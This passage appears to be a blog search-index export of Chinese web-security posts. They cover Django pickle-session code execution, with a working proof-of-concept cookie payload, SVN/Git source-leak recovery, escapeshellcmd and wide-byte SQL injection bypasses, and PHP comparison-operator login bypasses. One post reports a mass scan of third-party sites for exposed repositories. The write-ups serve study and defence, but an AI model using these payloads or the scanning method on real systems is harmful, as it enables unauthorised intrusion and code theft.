&quot;192.167.1.1&quot;, &quot;MASK&quot;: &quot;255.255.0.0&quot;,&quot;MULTI_STATUS&quot;: 409, &quot;MULTI_RESULT&quot;: &quot;invalid parameter&quot;&#125;]&#125;]&#125;, 8 重要ID不透明处理在系统一些敏感功能上，比如/user/1123 可获取id=1123用户的信息，为了防止字典遍历攻击，可对id进行url62或者uuid处理，这样处理的id是唯一的，并且还是字符安全的。 9 其他注意事项（1）请求数据，对于POST,DELETE方法中的数据都采用json格式，当然不是说rest架构不支持xml，由于xml太不好解析，对于大部分的应用json已经足够，近一些的趋势也是json越来越流行，并且json格式也不会有xml的一些安全问题，如xxe。使用json格式目前能防止扫描器自动扫描。（2）返回数据统一编码格式，统一返回类型，如Content-Type: application/json; charset=”UTF-8”（3）在逻辑实现中，json解码之后进行参数验证或者转义操作，第一步json格式验证，第二步具体参数验证基本上能防止大部分的注入问题了。（4）在传输过程中，采用SSL保证传输安全。（5）存储安全，重要信息加密存储，如认证信息hash保存。 总之，尽量使用SSL。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>REST API</tag>
        <tag>安全设计指南</tag>
        <tag>API KEY</tag>
        <tag>授权认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从Django的SECTET_KEY到代码执行]]></title>
    <url>%2F2015%2F04%2F01%2F%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[1 背景最近审查代码发现某些产品在登录的JS代码中泄露了SECRET_KEY,将该值作为密码加密的盐，这样就暴露了加密salt不太好吧，更重要的是对django的安全造成了极大的威胁。 2 SECRET_KEY作用SECTET_KEY在djanog中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：1，json object的签名2，加密函数，如密码重置，表单，评论，csrf的key，session数据 这里面就要重点讲到session的问题，在这里使用不当就会导致代码执行 3 代码执行3.1 settings的session设置django默认存储session到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有cookie等方式，如果采用了cookie机制则有可能代码执行，settings配置如下：SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39; 3.2 django 1.6以下在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化。代码执行只存在于使用pickle序列话的操作中。 3.3 session处理流程可以简单的分为两部分，process_request和process_response,前者负责选择session引擎，初始化cookie数据。见代码12345class SessionMiddleware(object): def process_request(self, request): engine = import_module(settings.SESSION_ENGINE) session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, None) request.session = engine.SessionStore(session_key) process_response则是处理返回给用户的cookie信息，比如修改过期时间等。在将session存入缓存后，可能在某个操作中会用到session信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用pickle机制的话就存在代码执行。反序列化的代码位于django.core.signing.py中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用JSON引擎，下面是反序列话loads的代码：123456789101112131415def loads(s, key=None, salt='django.core.signing', serializer=JSONSerializer, max_age=None): """ Reverse of dumps(), raises BadSignature if signature fails """ base64d = smart_str( TimestampSigner(key, salt=salt).unsign(s, max_age=max_age)) decompress = False if base64d[0] == '.': # It's compressed; uncompress it first base64d = base64d[1:] decompress = True data = b64_decode(base64d) if decompress: data = zlib.decompress(data) return serializer().loads(data) 3.4 构造POC12345678910111213141516171819202122import osos.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')from django.conf import settingsfrom django.core import signingfrom django.contrib.sessions.backends import signed_cookiesclass Run(object): def __reduce__(self): return (os.system,('touch /tmp/xxlegend.log',))sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')print sessimport urllib2import cookieliburl = 'http://10.24.35.228:8000/favicon.ico'headers = &#123;'Cookie':'sessionid="%s"' %(sess)&#125;request = urllib2.Request(url,headers = headers)response = urllib2.urlopen(request)print response.read() 通过序列化Run类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在/tmp目录创建xxlegend.log文件，同时web报500错误。 总结利用条件总结起来就是这么几句话，首先泄露了SECRET_KEY,其次session引擎采用了signed_cookies,django版本小于1.6即存在代码执行问题。同样的问题也存在于python的其他web框架中，如flask，bottle。 https://github.com/danghvu/pwp/blob/master/exploit.pyhttps://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.htmlhttps://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/http://www.shysecurity.com/post/Reekeehttp://python.usyiyi.cn/django/topics/http/sessions.htmlhttps://github.com/django/django/blob/stable/1.5.x/django/core/signing.pyhttp://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>SECRET_KEY</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django安全机制]]></title>
    <url>%2F2015%2F04%2F01%2FDjango%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[#1 xssdjango 已经能防范95%的xss问题，主要原理就是将&lt;,&gt;,&amp;做了转化，但是如下情况还是无能为力（1）属性有动态内容，正确：&lt;img alt=&quot;{{good}}&quot;&gt;,错误：&lt;img alt={{bad}}&gt;,请确保加上双引号。（2）插入到CSS中的数据(style 标签和属性),以及javascript(script标签,事件处理器,onclick等其他属性),在这些标签内请手动escape.（3）还有就是使用了mark_safe跳过了template默认机制或者autoescape关闭了。（4）涉及到dom类型的xss，如document.write等（5）HttpResponse返回动态内容另外注意属性中包含url(href,img src)时验证url协议在白名单内(如http,https,mailto,ftp) #2 csrf1，确保django.middleware.csrf.CsrfViewMiddleware已经开启 在settings.py中，默认是存在的。2，在所有的post表单中中添加了csrf_token，如{% csrf_token %}3，在相应的view函数中，使用了django.template.context_processors.csrf，用法有两种，一个是RequestContext,另外就是手工引入,如下是手工引入:12345678from django.shortcuts import render_to_responsefrom django.template.context_processors import csrfdef my_view(request): c = &#123;&#125; c.update(csrf(request)) # ... view code here return render_to_response("a_template.html", c) @csrf_exempt装饰器是去除csrf防护,另外内置的CSRF保护机制对子域也是无能为力,比如应用在example.com,有一个子域alice.example.com放置用户可控制的内容,这个时候csrf机制是不起作用的.最后注意不要使用get请求去做增删改操作,否则内置的CSRF机制也是无效的. #3 sql注入直接拼接的sql会有注入风险，那如何避免呢？使用django的数据库api，会根据对应的数据库加过滤，但是有两个例外：（1）extra方法中的where参数处,这个参数是故意设计成接受原始SQL；extra的正确用法：Entry.objects.extra(where=[&#39;headline=%s&#39;], params=[&#39;Lennon&#39;])错误用法：Entry.objects.extra(where=[&quot;headline=&#39;Lennon&#39;&quot;])（2）直接使用低层次的数据库api，如execute，raw，可以采用cursor.execute(sql, [user])方式避免，但是部分时候是失效的，如表的位置，列的位置，这种情况下可以使用django.db.connection.ops.quote_name来自己手工加过滤在有params的情况下，django会正确的转义，没有params的情况则不行。正确做法:12345678from django.db import connection def user_contacts(request): user = request.GET['username'] sql = "SELECT * FROM user_contacts WHERE username = %s" cursor = connection.cursor() cursor.execute(sql, [user]) # ... do something with the results #4 点击劫持django已经有X-Frame-Options middleware来处理，强烈建议添加 #5 host头验证使用django.http.HttpRequest.get_host() 可以获取到host，有伪造的话直接报错了，如果直接访问request.META则没有这效果 #6 文件上传django的imageField只会判断上传的文件是否有一个合法的png头，所以基本上无法限制有害文件的上传。（1）另建一个文件服务器（2）限制文件大小，防止dos攻击，如设置apache的LimitRequestBody大小（3）确保文件不可执行（4）传到二级域名上，比如说传到usercontent-example.com上而不是usercontent.example.com上（5）限制文件上传的类型 #7 email头注入用于发送垃圾邮件，hacker发送如下：hello\ncc:spamvictim@example.com 就转变成了To: hardcoded@example.com Subject: hello cc: spamvictim@example.com 可使用djaong.core.mail来发送，他是不允许任意字段中包含newlines #8 目录遍历目录遍历也算一种注入,主要是突破目录限制读取或者写入文件,django中内置的静态内容视图就是一个做转义很好的例子(django.views.static),相关代码如下:1234567891011121314151617import osimport posixpath path = posixpath.normpath(urllib.unquote(path))newpath = ''for part in path.split('/'): if not part: # strip empty path components continue drive, part = os.path.splitdrive(part) head, part = os.path.split(part) if part in (os.curdir, os.pardir): # strip '.' and '..' in path continue newpath = os.path.join(newpath, part).replace('\\', '/')]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>安全属性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SVN和GIT信息泄漏利用原理及现状]]></title>
    <url>%2F2015%2F04%2F01%2FSVN%E5%92%8CGIT%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E5%8F%8A%E7%8E%B0%E7%8A%B6%2F</url>
    <content type="text"><![CDATA[1，google hacksvn 搜索技巧图1git 搜索技巧图2 2，svn信息利用原理2.1 svn&lt;=1.6从svn的结构图可以看到一个目录text-base,这里有我们源文件的备份,比如要下载somedomain/phpinfo.php,直接访问目录somedomain/.svn/text-base/phpinfo.php.text-base,一般的服务器既不会阻止该目录也不会解释该后缀，我们就可以直接读到本地来。现在只是访问最顶层的文件信息，那怎么遍历呢？这里面就有.svn/entries，这个文件包含着该基础目录下所有的文件和目录，直接递推查找就行。 2.2 svn&gt;1.6svn在1.6之后引入了wc.db来管理文件，该文件位于.svn/wc.db。普通文件位置：somedomain/.svn/pristine/“XX”/“CHECKSUM”.svn-base,CHECKSUM是文件的sha1值，xx则是他的前两位。那这个CHECKSUM去哪找呢？就是我们刚才提到的wc.db，这是一个sqlite数据库。数据库的大体结构如下：123456789101112$ sqlite3 wc.db .tablesACTUAL_NODE NODES PRISTINE WC_LOCKEXTERNALS NODES_BASE REPOSITORY WORK_QUEUELOCK NODES_CURRENT WCROOT$ sqlite3 wc.db 'select local_relpath, checksum from NODES'index.php|$sha1$4e6a225331f9ae872db25a8f85ae7be05cea6d51scripts/menu.js|$sha1$fabeb3ba6a96cf0cbcad1308abdbe0c2427eeebfstyle/style.js|$sha1$2cc5590e0ba024c3db77a13896da09b39ea74799$ sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'index.php|.svn/pristine/4e/4e6a225331f9ae872db25a8f85ae7be05cea6d51.svn-basescripts/menu.js|.svn/pristine/fa/fabeb3ba6a96cf0cbcad1308abdbe0c2427eeebf.svn-basestyle/style.js|.svn/pristine/2s/2cc5590e0ba024c3db77a13896da09b39ea74799.svn-base 第一步下载wc.db,然后从NODES表中找到文件名和其sha1值，最后构造下载链接。 3，git 信息利用原理首先从git/config信息里面可以得到仓库地址1234567891011[core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true[remote &quot;origin&quot;] fetch = +refs/heads/*:refs/remotes/origin/* url = git@git.jingdigital.net:root/pcb001.git[branch &quot;master&quot;] remote = origin merge = refs/heads/master 基本上三步走：（1）下载.git/index文件，这是一种git特有的格式，在该文件中包含着文件名和文件SHA1值。（2）根据该文件SHA1值到objects目录下载相应文件，具体路径somedomain/.git/objects/“XX”/“CHECKSUM”（3）zlib解压文件，按照原始目录写入源代码。 4，对国内80端口的简单扫描有了前面这些基础，就可以通过泄漏的信息来还原代码，能还原代码的话就可以干很多事了。最常见就是代码中泄漏email地址，数据库连接方式，调试接口，一些第三方key的泄漏。另外还可以对你感兴趣的目标进行代码审计，发现注入，命令执行等等。 4.1 扫描实现（1）从文件读取80ip段数据，设最大并发16，最大连接数60，这个时候的带宽基本控制在600KB，利用周末时间跑了一天即可跑完。（2）设置pycurl的一些参数，如PROXY,MAXREDIRS=0，这样就不跳转了，nosignal=1 这个参数必须为1，这是pycurl的一个bug，中间测试的过程中就是因为参数未加，导致跑了半天结果中途挂了。（3）请求/.git/config信息，如果200，返回的类型为text/plain并且存在repositoryformatversion字段。请求/.svn/entries,如果200，Content-Type为text/plain,并且dir存在于返回值。其实这个是有误的，因为在svn大于1.6的情况下，在返回值中只有一个简单的数字，并不存在dir，所以扫描结果中基本上没有1.6以上的结果。 4.2 结果过滤在扫描的结果中分析出现的url，有些.svn/entries返回200，但是首页确是有问题，还有发现某些ip不在中国。于是写了脚本去请求这些url的首页，并且从一个ip查询网站去查询ip地址归属。 4.3 初步结果在525万80端口数据中，跑出6000条结果，相当于千分之一的概率，另外还未包括前面对svn 1.6判断有误的分析，所以这个概率还是很高的。简单的分析了git信息的泄漏，总共有接近600条数据，去除在国外的和首页不正常的，能达到250多，其中差不多一半的都是在阿里云的ip上，这些公司一般都是创业公司。在这些泄漏的代码中sql注入一般很少。svn的话，一般都是一些比较老的网站，这主要可能还是我前面的判断逻辑有点小问题。注入问题比较严重。]]></content>
      <categories>
        <category>信息泄露</category>
      </categories>
      <tags>
        <tag>SVN</tag>
        <tag>GIT</tag>
        <tag>信息泄露</tag>
        <tag>利用原理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从escapeshellcmd bypass说起到宽字节注入]]></title>
    <url>%2F2015%2F03%2F01%2F%E4%BB%8Eescapeshellcmd%20bypass%E8%AF%B4%E8%B5%B7%E5%88%B0%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1 php 多字节绕过escapeshellcmdescapeshellcmd()对shell元字符过滤加反斜杠；反斜线（\）会在以下字符之前插入： #&amp;;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF，但在php5.2.5及之前存在通过输入多字节绕过escapeshellcmd的问题。5.2.6 已经修复了该问题。 执行 escapeshellcmd(“echo “.chr(0xc0).”;id”);加上反斜杠之后，也就是echo \xc0\x5c;id,在中文环境中\xc0\x5c是会被认为是gbk字符的。1234567&gt;&gt;&gt; hex(ord('\\'))'0x5c'&gt;&gt;&gt; s='\xc0\x5c'&gt;&gt;&gt; print s.decode('gbk').encode('utf8')繺&gt;&gt;&gt; s.decode('gbk').encode('utf8')'\xe7\xb9\xba' \被吃掉之后于是就变成了echo 繺;id 了。gbk是宽字节，两个字节，gbk字符范围：8140-FEFE，首字节在81-FE直接，尾字节在40-FE之间，显然5C在尾字节中。考虑0xbf;id,escape之后就变成了0xbf5c;id，0xbf5c是一个合法的GBK编码，那就变成了[0xbf5c];id了。而utf8表示中文一般三个字节。同样受影响的还有escapeshellarg()，源码中的处理是一个字节一个字节来处理的。这种漏洞应该有一定普遍性，在当时来说。下面我们看下修复的源代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374char *php_escape_shell_cmd(char *str) &#123; register int x, y, l; char *cmd; char *p = NULL; TSRMLS_FETCH(); l = strlen(str); cmd = safe_emalloc(2, l, 1); //申请了2倍字符 for (x = 0, y = 0; x &lt; l; x++) &#123; int mb_len = php_mblen(str + x, (l - x)); //这一段是5.2.6新加的，就是在处理多字节符号的时候，当多字节字符小于0的时候不处理，大于1的时候跳过，等于1的时候执行过滤动作 /* skip non-valid multibyte characters */ if (mb_len &lt; 0) &#123; continue; &#125; else if (mb_len &gt; 1) &#123; memcpy(cmd + y, str + x, mb_len); y += mb_len; x += mb_len - 1; continue; &#125; switch (str[x]) &#123; case '"': case '\'':#ifndef PHP_WIN32 if (!p &amp;&amp; (p = memchr(str + x + 1, str[x], l - x - 1))) &#123; /* noop */ &#125; else if (p &amp;&amp; *p == str[x]) &#123; p = NULL; &#125; else &#123; cmd[y++] = '\\'; &#125; cmd[y++] = str[x]; break;#endif case '#': /* This is character-set independent */ case '&amp;': case ';': case '`': case '|': case '*': case '?': case '~': case '&lt;': case '&gt;': case '^': case '(': case ')': case '[': case ']': case '&#123;': case '&#125;': case '$': case '\\': case '\x0A': /* excluding these two */ case '\xFF':#ifdef PHP_WIN32 /* since Windows does not allow us to escape these chars, just remove them */ case '%': cmd[y++] = ' '; break;#endif cmd[y++] = '\\'; /* fall-through */ default: cmd[y++] = str[x]; &#125; &#125; cmd[y] = '\0'; return cmd;&#125; 这个bypass已经成为过去时了，但是还是有很大的借鉴意义，就是宽字节注入，这种情况不仅仅发生命令注入时，更多的时候在sql注入，下面来分析一下宽字节注入如下三种情况，都是由于宽字节的问题导致的。 2 宽字节sql注入1，一种情况 iconv转换，addslashes之后从gbk转到utf8123456789101112$user = $_POST[ 'username' ];$user = addslashes($user);$user = iconv("gbk", 'utf8', $user);$pass = $_POST[ 'password' ];$pass = md5( $pass );$qry = "SELECT * FROM `users` WHERE user='$user' AND password='$pass';";print_r($qry);$result = @mysql_query($qry) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );var_dump($result); 处理过程如下：%bf%27—-（addslashes）-&gt;%bf%5c%27—–（utf8）—-&gt;縗’ 这样单引号就放出来了，大体流程是%bf%27经过addslashes之后变成了%bf%5c%27，再经过iconv从gbk转换为utf8的时候，变成了%e7%b8%97%27，也就是縗’。利用的前提是设置了set names utf8。 2，在php中使用mysql_query(‘set names gbk’),指定了客户端，连接层，结果为gbk编码。构造数据%bf%27，过程和第一种情况类似%bf%27—(addslashes)–&gt;%bf%5c%27—(set names gbk)—&gt;縗’ 3，iconv转换从utf8到gbk，set names字符集为gbk，构造数据如下%e9%8c%a6带入反斜杠\,注释掉单引号大体数据流程：%e9%8c%a6—–(utf8)—-%e5%5c—-(addslashes)—&gt;%e5%5c%5c12345&gt;&gt;&gt; s = '\xe9\x8c\xa6'&gt;&gt;&gt; s.decode('utf8')u'\u9326'&gt;&gt;&gt; s.decode('utf8').encode('gbk')'\xe5\\' 总之一条，都是打的%5c的注意，要么转义后转utf8吃掉%5c,要么转utf8后再转义放出%5c 参考：http://seclists.org/bugtraq/2008/May/61http://www.sektioneins.de/en/advisories/advisory-032008-php-multibyte-shell-command-escaping-bypass-vulnerability.htmlhttp://php.net/ChangeLog-5.phphttp://php.net/releases/]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>从escapeshellcmd</tag>
        <tag>宽字节注入</tag>
        <tag>mysql</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Php比较操作符带来的安全问题]]></title>
    <url>%2F2015%2F01%2F01%2FPHP%E6%AF%94%E8%BE%83%E6%93%8D%E4%BD%9C%E7%AC%A6%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1 比较操作符php的比较操作符有==（等于）松散比较，===（完全等于）严格比较，这里面就会引入很多有意思的问题。在松散比较的时候，php会将他们的类型统一，比如说字符到数字，非bool类型转换成bool类型，为了避免意想不到的运行效果，应该使用严格比较。如下是php manual上的比较运算符表： 12345678910例子 名称 结果$a == $b 等于 TRUE，如果类型转换后 $a 等于 $b。$a === $b 全等 TRUE，如果 $a 等于 $b，并且它们的类型也相同。$a != $b 不等 TRUE，如果类型转换后 $a 不等于 $b。$a &lt;&gt; $b 不等 TRUE，如果类型转换后 $a 不等于 $b。$a !== $b 不全等 TRUE，如果 $a 不等于 $b，或者它们的类型不同。$a &lt; $b 小与 TRUE，如果 $a 严格小于 $b。$a &gt; $b 大于 TRUE，如果 $a 严格大于 $b。$a &lt;= $b 小于等于 TRUE，如果 $a 小于或者等于 $b。$a &gt;= $b 大于等于 TRUE，如果 $a 大于或者等于 $b。 2 安全问题2.1 hash比较缺陷php在处理hash字符串的时候会用到!=,==来进行hash比较，如果hash值以0e开头，后边都是数字，再与数字比较，就会被解释成0*10^n还是为0，就会被判断相等，绕过登录环节。1234root@kali:~/tool# php -r &apos;var_dump(&quot;00e0345&quot; == &quot;0&quot;);var_dump(&quot;0e123456789&quot;==&quot;0&quot;);var_dump(&quot;0e1234abc&quot;==&quot;0&quot;);&apos;bool(true)bool(true)bool(false) 当全是数字的时候，宽松的比较会执行尽力模式，如0e12345678会被解释成0*10^12345678,除了e不全是数字的时候就不会相等，这能从var_dump(&quot;0e1234abc&quot;==&quot;0&quot;)可以看出来。 2.2 bool 欺骗当存在json_decode和unserialize的时候，部分结构会被解释成bool类型，也会造成欺骗。json_decode示例代码：123456$json_str = '&#123;"user":true,"pass":true&#125;';$data = json_decode($json_str,true);if ($data['user'] == 'admin' &amp;&amp; $data['pass']=='secirity')&#123; print_r('logined in as bool'."\n");&#125; 运行结果：12root@kali:/var/www# php /root/php/hash.phplogined in as bool unserialize示例代码：123456$unserialize_str = 'a:2:&#123;s:4:"user";b:1;s:4:"pass";b:1;&#125;';$data_unserialize = unserialize($unserialize_str);if ($data_unserialize['user'] == 'admin' &amp;&amp; $data_unserialize['pass']=='secirity')&#123; print_r('logined in unserialize'."\n");&#125; 运行结果如下：12root@kali:/var/www# php /root/php/hash.phplogined in unserialize 2.3 数字转换欺骗123456789$user_id = ($_POST['user_id']); if ($user_id == "1") &#123; $user_id = (int)($user_id); #$user_id = intval($user_id); $qry = "SELECT * FROM `users` WHERE user_id='$user_id';"; &#125; $result = mysql_query($qry) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); print_r(mysql_fetch_row($result)); 将user_id=0.999999999999999999999发送出去得到结果如下：123456789Array( [0] =&gt; 0 [1] =&gt; lxx&apos; [2] =&gt; [3] =&gt; [4] =&gt; [5] =&gt; ) 本来是要查询user_id的数据，结果却是user_id=0的数据。int和intval在转换数字的时候都是就低的，再如下代码:123456if ($_POST['uid'] != 1) &#123; $res = $db-&gt;query("SELECT * FROM user WHERE uid=%d", (int)$_POST['uid']); mail(...);&#125; else &#123; die("Cannot reset password of admin");&#125; 假如传入1.1，就绕过了$_POST[‘uid’]！=1的判断，就能对uid=1的用户进行操作了。另外intval还有个尽力模式，就是转换所有数字直到遇到非数字为止，如果采用:1234if (intval($qq) === &apos;123456&apos;)&#123; $db-&gt;query(&quot;select * from user where qq = $qq&quot;)&#125; 攻击者传入123456 union select version()进行攻击。 2.4 PHP5.4.4 特殊情况这个版本的php的一个修改导致两个数字型字符溢出导致比较相等12$ php -r &apos;var_dump(&quot;61529519452809720693702583126814&quot; == &quot;61529519452809720000000000000000&quot;);&apos;bool(true) 3 题外话：同样有类似问题的还有php strcmp函数,manual上是这么解释的，int strcmp ( string $str1 , string $str2 ),str1是第一个字符串，str2是第二个字符串，如果str1小于str2，返回str2,返回&gt;0,两者相等返回0，假如str2为一个array呢？12345678$_GET['key'] = array();$key = "llocdpocuzion5dcp2bindhspiccy";$flag = strcmp($key, $_GET['key']);if ($flag == 0) &#123; print "Welcome!";&#125; else &#123; print "Bad key!";&#125; 运行结果：123root@kali:~/php# php strcmp.phpPHP Warning: strcmp() expects parameter 2 to be string, array given in /root/php/strcmp.php on line 13Welcome! 参考：1，http://phpsadness.com/sad/472，http://php.net/language.operators.comparison3，http://indico.cern.ch/event/241705/material/slides/0.pdf]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>比较操作符</tag>
        <tag>Comparison operators</tag>
        <tag>安全问题</tag>
      </tags>
  </entry>
</search>